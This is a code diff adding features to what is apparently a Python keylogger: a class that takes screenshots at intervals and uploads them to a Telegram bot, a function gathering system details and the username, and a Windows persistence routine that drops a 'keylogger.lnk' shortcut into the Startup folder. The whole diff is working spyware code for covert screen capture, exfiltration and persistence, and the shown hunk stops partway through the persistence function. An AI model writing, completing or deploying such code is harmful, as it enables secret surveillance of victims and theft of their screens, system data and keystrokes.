@@ -134,3 +134,56 @@ class Uploader:
 
 # Take screenshots periodically
 class ScreenshotCapture:
+
+    def __init__(self) -> None:
+        pass
+
+    def take_screenshot(self) -> None:
+        try:
+            screenshot = pyautogui.screenshot()
+            screenshot.save(SCREENSHOT_FILENAME)
+            with open(SCREENSHOT_FILENAME, 'rb') as fh:
+                files = {'document' : fh}
+                resp = requests.post(f'https://api.telegram.org/bot{TOKEN}/sendDocument?chat_id={CHAT_ID}', files=files)
+
+                if resp.status_code != 200:
+                    alarm(f'Screenshot Error Code: {resp.status_code}')
+
+        except Exception as e:
+            alarm(f'Screenshot Error: {e}')
+
+    def capture_periodically(self) -> None:
+        while True:
+            self.take_screenshot()
+            sleep(SCREENSHOT_INTERVAL)
+
+    def __del__(self) -> None:
+        pass
+
+# Collect system information
+def collect_system_info() -> str:
+    system_info = f"""
+    System Information:
+    OS: {platform.system()} {platform.release()}
+    Version: {platform.version()}
+    Machine: {platform.machine()}
+    Processor: {platform.processor()}
+    Username: {getenv('USER') if name != 'nt' else getenv('USERNAME')}
+    """
+    return system_info
+
+# Persistence: Add to startup
+def add_to_startup() -> None:
+    try:
+        if name == 'nt':  # Windows
+            startup_folder = path.join(getenv('APPDATA'), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
+            script_path = path.abspath(__file__)
+            shortcut_path = path.join(startup_folder, 'keylogger.lnk')
+            if not exists(shortcut_path):
+                import winshell
+                from win32com.client import Dispatch
+                shell = Dispatch('WScript.Shell')
+                shortcut = shell.CreateShortCut(shortcut_path)
+                shortcut.Targetpath = script_path
+                shortcut.WorkingDirectory = path.dirname(script_path)
+                shortcut.save()
